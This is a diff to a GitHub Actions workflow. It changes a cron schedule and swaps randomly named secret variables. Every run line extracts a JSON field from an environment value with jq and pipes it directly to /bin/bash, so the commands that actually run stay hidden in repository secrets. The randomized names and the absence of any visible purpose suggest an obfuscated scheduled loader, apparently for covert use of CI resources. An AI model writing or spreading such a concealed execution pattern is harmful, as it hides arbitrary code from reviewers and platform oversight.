@@ -2,29 +2,31 @@ name: qingtongqingong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
+    - cron: '13 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qingtongqingong
         env:
-          sekb56158: ${{ secrets.sekb56158 }}
+          nol87: ${{ secrets.nol87 }}
         run: |
-          echo $sekb56158 | jq -r .g84 | /bin/bash
-          echo $lh713 | jq -r .lcsvi94 | /bin/bash
-          echo $jsi85413 | jq -r .ndav78 | /bin/bash
-          echo $sjd51347 | jq -r .gyuzg7 | /bin/bash
-          echo $bqumf96 | jq -r .evas01 | /bin/bash
-          echo $dgzqy9 | jq -r .juwxx063 | /bin/bash
-          echo $amr21459 | jq -r .k7 | /bin/bash
-          echo $pq52300 | jq -r .ddal207 | /bin/bash
-          echo $mstdz717 | jq -r .un780 | /bin/bash
-          echo $dq56085 | jq -r .jzh00 | /bin/bash
-          echo $qx6186 | jq -r .wsmqp839 | /bin/bash
-          echo $vbju0 | jq -r .duw6662 | /bin/bash
-          echo $zzwjj032 | jq -r .umes03038 | /bin/bash
-          echo $vfd38581 | jq -r .bvh9 | /bin/bash
+          echo $nol87 | jq -r .px924 | /bin/bash
+          echo $szz08090 | jq -r .evni77119 | /bin/bash
+          echo $dr2 | jq -r .qtu11 | /bin/bash
+          echo $o20078 | jq -r .ku60969 | /bin/bash
+          echo $qkh07080 | jq -r .axjwn30 | /bin/bash
+          echo $h3 | jq -r .bjw55 | /bin/bash
+          echo $fnp5640 | jq -r .ol7379 | /bin/bash
+          echo $x14 | jq -r .fw4 | /bin/bash
+          echo $xarzf91 | jq -r .kz512 | /bin/bash
+          echo $t10 | jq -r .fvt182 | /bin/bash
+          echo $oahd55 | jq -r .r9 | /bin/bash
+          echo $l10 | jq -r .ritgh4 | /bin/bash
+          echo $cox20799 | jq -r .v4021 | /bin/bash
+          echo $gxn72606 | jq -r .pv309 | /bin/bash
+          echo $iffjm6 | jq -r .yqr5696 | /bin/bash
 
